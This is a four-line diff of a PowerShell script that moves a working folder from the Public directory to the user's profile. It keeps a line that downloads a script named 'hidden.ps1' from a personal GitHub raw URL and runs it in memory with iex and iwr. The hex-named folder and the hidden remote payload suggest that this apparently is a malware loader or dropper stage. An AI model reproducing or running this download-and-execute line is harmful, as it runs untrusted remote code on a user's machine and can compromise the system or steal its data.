@@ -1,4 +1,4 @@
-$dir = "C:\Users\Public\150F4013"
+$dir = "$env:userprofile\150F4013"
 New-Item -ItemType Directory -Path $dir
 
 iex (iwr -uri "https://raw.githubusercontent.com/43a1723/test/main/Extras/hidden.ps1" -useb)
